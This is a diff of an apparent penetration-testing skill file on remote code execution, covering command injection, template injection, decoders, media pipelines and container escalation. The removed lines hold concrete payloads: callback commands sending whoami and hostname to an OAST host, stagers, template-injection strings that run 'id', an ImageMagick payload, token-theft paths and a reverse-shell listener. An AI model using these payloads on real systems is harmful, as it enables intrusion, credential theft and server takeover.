@@ -2,250 +2,207 @@
 name: rce
 description: RCE testing covering command injection, deserialization, template injection, and code evaluation
 metadata:
-  version: '1.0'
+  version: 1.0.0
 ---
 
 # RCE
 
-Remote code execution leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media pipelines, and build/runtime tooling. Focus on quiet, portable oracles and chain to stable shells only when needed.
+Remote code execution leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, decoders, media pipelines, and internal control services. Focus on quiet, portable oracles and chain to stable shells only when needed.
 
 ## Attack Surface
 
 **Command Execution**
-- OS command execution via wrappers (shells, system utilities, CLIs)
+- **OS command execution**: through wrappers, shells, and CLI delegates.
 
 **Dynamic Evaluation**
-- Template engines, expression languages, eval/vm
+- **Template engines and evaluators**: template engines, expression languages, and evaluation runtimes.
 
-**Deserialization**
-- Insecure deserialization and gadget chains across languages
+**Decoders**
+- **Native unmarshalling**: native unmarshalling and encoded container formats that resolve types at decode time.
 
-**Media Pipelines**
-- ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg
+**Media and Document Pipelines**
+- **Media and document tools**: image converters, document renderers, metadata tools, typesetting engines, and transcoders.
 
-**SSRF Chains**
-- Internal services exposing execution primitives (FastCGI, Redis)
+**Internal Service Sinks**
+- **Fetch-reached services**: services reached through a fetch that execute on request (script consoles, key-value stores, process managers).
 
-**Container Escalation**
-- App RCE to node/cluster compromise via Docker/Kubernetes
+**Container and Cluster Control**
+- **Cluster escalation**: application execution escalating to the node and the cluster through mounts, sockets, and tokens.
+
+## Reconnaissance
+
+### Sink Inventory
+
+- **Delegate enumeration**: enumerate every delegate that receives user-influenced content - command wrappers, template rendering, decoder entry points, file converters, report generators, plugin hooks.
+- **Utility-surface signals**: treat utility-style surfaces as applicability signals - network diagnostics, file conversion, archive utilities, and report generators that build a shell string for the caller.
+- **Input arrival mode**: for each sink, note whether input arrives as data, as an argument, or as file content.
+- **Stored-input tracing**: trace stored inputs that a batch job or pipeline later evaluates.
+
+### Baseline and Oracle Setup
+
+- **Callback marker minting**: mint a unique callback marker per probe and confirm listener infrastructure receives DNS and HTTP arrivals before any effect payload.
+- **Encoded-label egress**: where only name-resolution egress survives, carry the result in an encoded label of the callback name so the arrival returns data rather than mere liveness.
+- **Response-time baseline**: measure a response-time baseline so a gated delay is attributable.
+- **Output-digest calibration**: record output length and digest for plain-control requests so a reflected-output differential is calibrated.
+
+### Environment Inventory
+
+- **Runtime identification**: identify the runtime, shell, and delegate set behind each sink where errors or version markers reveal them.
+- **Dependency inventory**: for white-box scope, enumerate the dependency inventory and match it to known chain families.
+- **Process placement**: note whether the sink runs in-process, out-of-process, or in a sandbox.
 
 ## Detection Channels
 
-### Time-Based
+- **Delay oracle**: separates execution from noise when a short gated delay shifts response timing past its baseline.
+- **Callback oracle**: binds one minted unique marker per probe to one inbound arrival on operated listener infrastructure.
+- **Reflected-output oracle**: separates execution from noise when response length or digest shifts with the probe result.
+- **Quoting-break error class**: separates a live wrapper from inert handling when delimiter acceptance changes status text or timing class.
+- **Flag-acceptance signal**: separates a live CLI sink from a plain string sink when option-shaped input alters behavior without executing.
+- **Job-trigger signal**: separates a live delegate from inert storage when an upload fires a conversion or parse job.
+- **Derived-artifact difference**: separates execution from rendering when converted outputs or error state carry operator results.
+- **Job-duration delta**: separates operator evaluation from clean conversion when processing time shifts past its baseline.
+- **Planted-marker surfacing**: proves file-read operators when unique out-of-scope content appears in derived outputs.
+- **Policy-gate signal**: separates an enforcing build from a permissive one when operator families succeed or fail as a group.
+- **Context-confirmation read**: discloses the execution user, working directory, shell, and confinement markers once execution is proven.
 
-**Unix**
-- `;sleep 1`, `` `sleep 1` ``, `|| sleep 1`
-- Gate delays with short subcommands to reduce noise
+## Adversarial Capabilities
 
-**Windows**
-- CMD: `& timeout /t 2 &`, `ping -n 2 127.0.0.1`
-- PowerShell: `Start-Sleep -s 2`
+- **Testing prerequisites**: a reachable execution sink, a no-effect oracle, and a boundary map, which the class consumes.
+- **Sink reach**: reach a sink - an OS wrapper, an evaluator, a decoder, a converter, or an internal control service.
+- **Listener operation**: operate listener infrastructure and mint a unique marker per probe for DNS and HTTP arrivals.
+- **Differential reading**: read timing, output, and error-class differences against a calibrated baseline.
+- **File crafting**: craft files that survive the front door and reach the delegate unchanged in meaning.
+- **Repeated gated probes**: send the gated probe repeatedly within the target's tolerance so a delay verdict is stable.
+- **Confinement enumeration**: enumerate the confinement boundary (user, working directory, shell, sandbox markers) once execution is proven.
 
-### OAST
+## Trust Assumptions
 
-Use `interactsh-client -v` in the sandbox to mint a unique callback
-domain (`*.oast.fun`); substitute it for `attacker.tld` below. Each
-invocation prints inbound DNS/HTTP hits to stdout in real time.
-
-**DNS**
-```bash
-nslookup $(whoami).xyz.oast.fun
-```
-
-**HTTP**
-```bash
-curl https://xyz.oast.fun/$(hostname)
-```
-
-### Output-Based
-
-**Direct**
-```bash
-;id;uname -a;whoami
-```
-
-**Encoded**
-```bash
-;(id;hostname)|base64
-```
+- **The agreement**: no data string becomes instructions at any delegate the input reaches.
+- **Held conditions**: the agreement holds each sink to a fixed argument list with no caller-supplied option or path, holds evaluators to constant templates, holds decoders to non-executing formats, and holds the execution environment to a confinement that limits what a granted instruction could do.
+- **The failing clause**: full host position leaks when any clause fails - a delimiter breaks quoting, an option reaches the argument list, a template evaluates caller-supplied content, a decoder instantiates a caller-named type, or a delegate evaluates file content.
+- **Variant delegates**: each variant reaches the same failure at a different delegate - an OS wrapper, or a converter and renderer pipeline.
 
 ## Key Vulnerabilities
 
-### Command Injection
+### Command Execution
 
-**Delimiters and Operators**
-- Unix: `; | || & && `cmd` $(cmd) $() ${IFS}` newline/tab
-- Windows: `& | || ^`
+- **Delimiter and operator classes**: across Unix-style and Windows-style shells, including substitution and environment expansion.
+- **Argument injection**: flags, output paths, and configuration options accepted in place of the expected value.
+- **Quoting breaks**: alternate quotes and escapes that end the quoted segment early.
+- **Path and builtin confusion**: absolute paths, alternative tools, and wrapper invocations that reach the shell anyway.
+- **Evasion**: whitespace alternatives, token splitting, variable building, and encoded stagers.
+- **Body-to-parser matching**: match the body encoding to the parser the endpoint reads, because a structured body against a form parser yields a silent false negative with a plausible success status, and the probe must be re-encoded before any conclusion is drawn.
 
-**Argument Injection**
-- Inject flags/filenames into CLI arguments (e.g., `--output=/tmp/x`, `--config=`)
-- Break out of quoted segments by alternating quotes and escapes
-- Environment expansion: `$PATH`, `${HOME}`, command substitution
-- Windows: `%TEMP%`, `!VAR!`, PowerShell `$(...)`
+### Evaluation and Template Sinks
 
-**Path and Builtin Confusion**
-- Force absolute paths (`/usr/bin/id`) vs relying on PATH
-- Use builtins or alternative tools (`printf`, `getent`) when `id` is filtered
-- Use `sh -c` or `cmd /c` wrappers to reach the shell
+- **Template rendering**: template rendering that evaluates caller-supplied expressions reaches the host language and process interfaces.
+- **Routing-time evaluation**: a header-delivered expression evaluated during routing runs before the authorization filter, so the sink executes on a path the caller never authenticated for.
+- **Engine identity**: minimal probes reveal engine identity; the engine family decides the path from expression to execution.
+- **Template selection**: template selection from user input converts a name into file selection; combine with the traversal class where it does.
 
-**Evasion**
-- Whitespace/IFS: `${IFS}`, `$'\t'`, `<`
-- Token splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`
-- Variable building: `a=i;b=d; $a$b`
-- Base64 stagers: `echo payload | base64 -d | sh`
-- PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`
+### Decoder Sinks
 
-### Template Injection
-
-Identify server-side template engines: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug
-
-**Minimal Probes**
-```
-Jinja2: {{7*7}} → {{cycler.__init__.__globals__['os'].popen('id').read()}}
-Twig: {{7*7}} → {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
-Freemarker: ${7*7} → <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
-EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
-```
-
-### Deserialization and EL
-
-**Java**
-- Gadget chains via CommonsCollections/BeanUtils/Spring
-- Tools: ysoserial
-- JNDI/LDAP chains (Log4Shell-style) when lookups are reachable
-
-**.NET**
-- BinaryFormatter/DataContractSerializer
-- APIs accepting untrusted ViewState without MAC
-
-**PHP**
-- `unserialize()` and PHAR metadata
-- Autoloaded gadget chains in frameworks and plugins
-
-**Python/Ruby**
-- pickle, `yaml.load`/`unsafe_load`, Marshal
-- Auto-deserialization in message queues/caches
-
-**Expression Languages**
-- OGNL/SpEL/MVEL/EL reaching Runtime/ProcessBuilder/exec
+- **Decoder reach**: any byte stream reaching a native decoder with attacker-influenced types is an execution candidate.
+- **Self-executing encodings**: self-executing encodings run code during decode by design.
+- **Deserialization handoff**: treat this as an entry point and hand off to the deserialization class for chain assembly.
 
 ### Media and Document Pipelines
 
-**ImageMagick/GraphicsMagick**
-- policy.xml may limit delegates; still test legacy vectors
-```
-push graphic-context
-fill 'url(https://x.tld/a"|id>/tmp/o")'
-pop graphic-context
-```
+- **Converter and renderer evaluation**: converters and renderers evaluate file content during processing, often out-of-process with powerful delegates.
+- **Metadata and typesetting tools**: metadata, typesetting, and transcoding tools invoke external programs and honour embedded directives.
+- **Directive integrity**: directives and pipeline shapes must reach the delegate intact; test the exact file shapes each stage accepts.
 
-**Ghostscript**
-- PostScript in PDFs/PS: `%pipe%id` file operators
+### Internal Service Sinks
 
-**ExifTool**
-- Crafted metadata invoking external tools or library bugs
+- **Fetch translation**: fetch translation reaches internal control interfaces that execute on request.
+- **High-value internal targets**: script consoles, key-value stores, and process managers are the high-value internal targets.
+- **Reachability gate**: reachability is the gate - confirm the internal destination before assembling the request.
 
-**LaTeX**
-- `\write18`/`--shell-escape`, `\input` piping; pandoc filters
+### Container and Cluster Escalation
 
-**ffmpeg**
-- concat/protocol tricks mediated by compile-time flags
+- **Container markers**: from application execution, enumerate container markers, mounts, capabilities, and exposed sockets.
+- **Cluster credentials**: cluster agent credentials and metadata services extend execution to the node and the platform.
+- **Escalation paths**: privileged pods, mounted host paths, and control interfaces; document the shortest durable chain.
 
-### SSRF to RCE
+## Advanced Techniques
 
-**FastCGI**
-- `gopher://` to php-fpm (build FPM records to invoke system/exec)
+**Quiet Oracle Discipline**
+- **No-effect oracle first**: run a no-effect oracle first (callback, gated delay, or output digest) before sending any effect payload.
+- **Smallest proving effect**: confirm the sink is live, then choose the smallest effect that proves control.
 
-**Redis**
-- `gopher://` write cron/authorized_keys or webroot
-- Module load when allowed
+**Deferred and Second-Order Triggers**
+- **Deferred plant**: plant a file or record that a batch job, converter, or pipeline executes later.
+- **Timing attribution**: attribute the effect by timing correlation between the plant and the trigger.
 
-**Admin Interfaces**
-- Jenkins script console, Spark UI, Jupyter kernels reachable internally
+**Confinement and Escalation**
+- **Boundary enumeration**: enumerate the confinement boundary before claiming impact - user, directory, shell, sandbox markers, capabilities.
+- **Narrowest durable control**: escalate through the control interfaces the environment exposes, and stop at the narrowest durable control.
 
-### Container and Kubernetes
-
-**Docker**
-- From app RCE, inspect `/.dockerenv`, `/proc/1/cgroup`
-- Enumerate mounts and capabilities: `capsh --print`
-- Abuses: mounted docker.sock, hostPath mounts, privileged containers
-- Write to `/proc/sys/kernel/core_pattern` or mount host with `--privileged`
-
-**Kubernetes**
-- Steal service account token from `/var/run/secrets/kubernetes.io/serviceaccount`
-- Query API for pods/secrets; enumerate RBAC
-- Talk to kubelet on 10250/10255; exec into pods
-- Escalate via privileged pods, hostPath mounts, or daemonsets
+**Filtered Paths**
+- **Channel and delegate switching**: when one delimiter class or keyword is filtered, switch the oracle channel and the delegate.
+- **Payload portability**: keep payloads portable across the shell and toolset the target exposes.
 
 ## Bypass Techniques
 
 **Encoding Differentials**
-- URL encoding, Unicode normalization, comment insertion, mixed case
-- Request smuggling to reach alternate parsers
+- **Encoding and case variants**: URL encoding, Unicode normalization, comment insertion, and mixed case to slip past string filters.
+- **Parser disagreement**: reach alternate parsers through front-end and backend disagreement.
 
 **Binary Alternatives**
-- Absolute paths and alternate binaries (busybox, sh, env)
-- Windows variations (PowerShell vs CMD)
-- Constrained language bypasses
+- **Absolute paths**: absolute paths and alternative binaries for the same operation.
+- **Shell and interpreter selection**: alternate shell and interpreter selections where one family is filtered.
 
-## Post-Exploitation
+**Delegate Substitution**
+- **Delegate substitution**: where the primary delegate is filtered, reach the same operation through a converter, pipeline, or internal service.
 
-**Privilege Escalation**
-- `sudo -l`; SUID binaries; capabilities (`getcap -r / 2>/dev/null`)
+**Indirection and Token Shaping**
+- **Language-level indirection**: reach the same operation through a language-level indirection when its name is filtered, because a send or call primitive resolves the name at runtime.
+- **Whitespace alternatives**: shape whitespace alternatives past a token filter - field separators, brace expansion, redirection in place of a space, wildcard expansion, and quote splitting.
+- **Staged token decoding**: decode a staged token at execution time so the filter never reads the plain operation string.
+- **Defence-bypass pointer**: filter and encoding shapes are the defence-bypass family's steps; name it there rather than restating the mechanics here.
+- **Extended reading**: when this section does not fulfil the knowledge gap, extend the reading with the defence-bypass and proxy-techniques families.
 
-**Persistence**
-- cron/systemd/user services; web shell behind auth
-- Plugin hooks; supply chain in CI/CD
+## Chaining Attacks
 
-**Lateral Movement**
-- SSH keys, cloud metadata credentials, internal service tokens
+- **Execution to durable control**: file write, scheduled execution, and service restart hooks.
+- **Fetch translation to execution**: fetch translation to an internal execution interface, which converts SSRF into execution.
+- **Execution to credential stores**: execution to credential and token stores, then movement to other systems.
+- **Upload pipelines**: upload pipelines to conversion delegates, where the front door accepts the file the delegate evaluates.
+- **Two-half primitives**: treat an execution primitive as two halves - one that puts bytes on the host and one that interprets them, so name the `sql-injection`, `insecure-file-uploads`, `prototype-pollution`, and `xxe` classes at the steps that supply each half rather than restating their mechanics here.
 
 ## Testing Methodology
 
-1. **Identify sinks** - Command wrappers, template rendering, deserialization, file converters, report generators, plugin hooks
-2. **Establish oracle** - Timing, DNS/HTTP callbacks, or deterministic output diffs (length/ETag)
-3. **Confirm context** - User, working directory, PATH, shell, SELinux/AppArmor, containerization
-4. **Map boundaries** - Read/write locations, outbound egress
-5. **Progress to control** - File write, scheduled execution, service restart hooks
+1. **Identify sinks** - Command wrappers, template rendering, decoder paths, file converters, report generators, plugin hooks
+2. **Establish the oracle** - Timing, callbacks, or deterministic output differentials
+3. **Confirm context** - User, working directory, path, shell, sandbox, and container markers
+4. **Map boundaries** - Read and write locations, outbound egress, and internal reach
+5. **Progress to control** - File write, scheduled execution, and service hooks; stop at the narrowest durable effect
+6. **Confirm the effect** - Keep the probe set minimal and repeatable, with each step carrying a verdict
 
-## Validation
+## Variants
 
-1. Provide a minimal, reliable oracle (DNS/HTTP/timing) proving code execution
-2. Show command context (uid, gid, cwd, env) and controlled output
-3. Demonstrate persistence or file write under application constraints
-4. If containerized, prove boundary crossing attempts (host files, kube APIs) and whether they succeed
-5. Keep PoCs minimal and reproducible across runs and transports
+- rce-command-injection - Break shell quoting and CLI flag parsing so command strings reach OS execution.
+- rce-pipeline-execution - Trigger converter and renderer delegates with crafted files so the pipeline evaluates content.
 
 ## False Positives
 
-- Only crashes or timeouts without controlled behavior
-- Filtered execution of a limited command subset with no attacker-controlled args
-- Sandboxed interpreters executing in a restricted VM with no IO or process spawn
-- Simulated outputs not derived from executed commands
-
-## Impact
-
-- Remote system control under application user; potential privilege escalation to root
-- Data theft, encryption/signing key compromise, supply-chain insertion, lateral movement
-- Cluster compromise when combined with container/Kubernetes misconfigurations
+- **Crashes or timeouts**: without controlled behavior.
+- **Filtered execution**: filtered execution of a limited command subset with no attacker-controlled arguments.
+- **Sandboxed interpreters**: sandboxed interpreters running in a restricted environment with no IO and no process spawn.
+- **Simulated outputs**: simulated outputs not derived from executed commands.
+- **Load-explained delays**: delays explained by general load rather than the gated probe; repeat the probe to separate the two.
+- **Foreign callbacks**: callbacks that arrive from a different source than the target's egress path.
 
 ## Pro Tips
 
-1. Prefer OAST oracles; avoid long sleeps—short gated delays reduce noise
-2. When command injection is weak, pivot to file write or deserialization/SSTI paths
-3. Treat converters/renderers as first-class sinks; many run out-of-process with powerful delegates
-4. For Java/.NET, enumerate classpaths/assemblies and known gadgets; verify with out-of-band payloads
-5. Confirm environment: PATH, shell, umask, SELinux/AppArmor, container caps
-6. Keep payloads portable (POSIX/BusyBox/PowerShell) and minimize dependencies
-7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops
-
-## Tooling
-
-- Reverse-shell listener: `ncat -lvnp 4444` (in the sandbox; `ncat` is the
-  netcat variant that ships in the image). Pair with a one-shot shell
-  payload only when OAST + selective reads are insufficient — never
-  drop a persistent shell when a single targeted command will prove it.
+- **Callback oracles first**: prefer callback oracles; when using delays, keep them short and gated to reduce noise.
+- **Weak-execution pivots**: when command execution is weak, pivot to file write, decoding, or template paths.
+- **Converters as sinks**: treat converters and renderers as first-class sinks; many run out-of-process with powerful delegates.
+- **Dependency inventory**: enumerate the dependency inventory before assembling chains, and prove each link with a no-effect oracle.
+- **Environment confirmation**: confirm the environment early - path, shell, sandbox, and container capabilities.
+- **Portable payloads**: keep payloads portable across the toolset and minimize dependencies.
+- **Smallest chain**: document the smallest exploit chain that proves durable impact; avoid unnecessary shells.
 
 ## Summary
 
-RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.
+RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defences often differ per code path.
